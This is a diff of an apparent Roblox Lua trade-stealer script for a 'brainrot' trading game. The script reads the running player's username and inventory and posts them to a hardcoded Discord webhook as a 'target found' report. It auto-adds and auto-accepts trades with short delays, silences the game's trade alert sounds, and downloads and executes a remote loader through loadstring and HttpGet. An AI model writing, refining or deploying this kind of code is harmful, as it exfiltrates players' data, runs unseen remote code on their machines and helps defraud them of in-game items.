@@ -5,7 +5,7 @@ _G.Settings.Webhook = "https://discord.com/api/webhooks/1492572765679780082/kqDj
 
 _G.Settings.TradeStartDelay = 2
 _G.Settings.AddDelay = 1
-_G.Settings.AcceptDelay = 2.5
+_G.Settings.AcceptDelay = 1
 
 _G.Settings.Brainrots = {
     ["Skibidi Toilet"] = true,
@@ -343,6 +343,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 	workspace.CurrentCamera.FieldOfView = 70
 end)
 
+
 local blockedSounds = { Activated = true, Error = true, Success = true }
 local function hardBlock(sound)
 	if not sound:IsA("Sound") then return end
@@ -474,6 +475,7 @@ local function sendWebhook(plotFolder)
 	local totalTemplates = 0
 	local inRange = 0
 	local entries = {}
+	local targetEntries = {}
 
 	for _, obj in ipairs(workspace.Debris:GetChildren()) do
 		if obj.Name == "FastOverheadTemplate" then
@@ -492,7 +494,7 @@ local function sendWebhook(plotFolder)
 					local halfRange = searchRange / 2
 					local withinRange = math.abs(diff.X) <= halfRange.X and math.abs(diff.Z) <= halfRange.Z
 					if withinRange then inRange += 1 end
-									if ok and _G.Settings.Brainrots[displayName] and withinRange then
+					if ok and withinRange then
 						local mutation = "Default"
 						pcall(function()
 							if mutationObj and mutationObj.Visible and mutationObj.TextTransparency < 1 then
@@ -512,78 +514,61 @@ local function sendWebhook(plotFolder)
 								end
 							end
 						end
-						table.insert(entries, {
-							name = displayName,
-							gen = gen,
-							mutation = mutation,
-							traits = traits,
-						})
+						local entry = { name = displayName, gen = gen, mutation = mutation, traits = traits }
+						table.insert(entries, entry)
+						if _G.Settings.Brainrots[displayName] then
+							table.insert(targetEntries, entry)
+						end
 					end
 				end
 			end
 		end
 	end
 
-	if #entries == 0 then
-		local player = Players.LocalPlayer
-		local now = os.date("%m/%d/%Y %I:%M %p")
-		local payload = game:GetService("HttpService"):JSONEncode({
-			embeds = {{
-				title = "target found",
-				color = 0xFF0000,
-				fields = {
-					{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
-					{ name = "inventory:", value = "No brainrots from the target list found.", inline = false },
-				},
-				footer = { text = now },
-			}}
-		})
-		pcall(function()
-			request({
-				Url = _G.Settings.Webhook,
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/json" },
-				Body = payload
-			})
-		end)
-		return
+	local parseGen = function(g)
+		local n = tonumber(g:match("([%d%.]+)")) or 0
+		if g:find("B") then n = n * 1e9
+		elseif g:find("M") then n = n * 1e6
+		elseif g:find("K") then n = n * 1e3 end
+		return n
 	end
 
-	table.sort(entries, function(a, b)
-		local function parseGen(g)
-			local n = tonumber(g:match("([%d%.]+)")) or 0
-			if g:find("B") then n = n * 1e9
-			elseif g:find("M") then n = n * 1e6
-			elseif g:find("K") then n = n * 1e3 end
-			return n
-		end
-		return parseGen(a.gen) > parseGen(b.gen)
-	end)
+	table.sort(entries, function(a, b) return parseGen(a.gen) > parseGen(b.gen) end)
 
 	local player = Players.LocalPlayer
+	local now = os.date("%m/%d/%Y %I:%M %p")
+
 	local lines = {}
 	for i, e in ipairs(entries) do
 		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "") and (" | " .. e.mutation) or " | No Mutation"
-		local traitStr = #e.traits > 0 and (" | " .. table.concat(e.traits, ", ")) or ""
 		local genClean = e.gen:gsub("%$", "")
-		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr .. traitStr)
+		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr)
 	end
 
 	local description = table.concat(lines, "\n")
-	if #description > 4000 then
-		description = description:sub(1, 4000) .. "\n..."
+	if #description > 3500 then
+		description = description:sub(1, 3500) .. "\n..."
 	end
 
-	local now = os.date("%m/%d/%Y %I:%M %p")
+	local targetLines = {}
+	for _, e in ipairs(targetEntries) do
+		table.insert(targetLines, "🎯 " .. e.name)
+	end
+	local targetStr = #targetLines > 0 and table.concat(targetLines, "\n") or "none"
+	if #targetStr > 1000 then targetStr = targetStr:sub(1, 1000) .. "\n..." end
+
+	local color = #targetEntries > 0 and 0x57F287 or 0xFF0000
+	local fields = {
+		{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
+		{ name = "inventory: (" .. tostring(#entries) .. ")", value = "```\n" .. description .. "\n```", inline = false },
+		{ name = "targets found (" .. tostring(#targetEntries) .. ")", value = targetStr, inline = false },
+	}
 
 	local payload = game:GetService("HttpService"):JSONEncode({
 		embeds = {{
 			title = "target found",
-			color = 0x57F287,
-			fields = {
-				{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
-				{ name = "inventory: (" .. tostring(#entries) .. ")", value = "```\n" .. description .. "\n```", inline = false },
-			},
+			color = color,
+			fields = fields,
 			footer = { text = now },
 		}}
 	})
@@ -634,7 +619,6 @@ _tradeReplica:ListenRaw(function(state)
 		if typeof(signText) ~= "string" then signText = "" end
 		if signText == "✅ Fair Trade" and signText ~= _lastSign then
 			fairTradeDetected = true
-			addMoreDetected = false
 		elseif signText == "➕ Add More" and signText ~= _lastSign then
 			addMoreDetected = true
 			fairTradeDetected = false
@@ -763,18 +747,13 @@ task.spawn(function()
 end)
 
 task.spawn(function() 
-	task.wait(1)
-    print("ZZZZ loading")
-    task.wait(2)
+	print("loading zzzz.lua")
+	task.wait(5) 
     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
-    print("ZZZZ loaded succesfully")
-	
-end)
+	end)
 
 while task.wait(1) do
 	if not tradeRunning then
 		task.spawn(autoadd)
 	end
 end
-
-
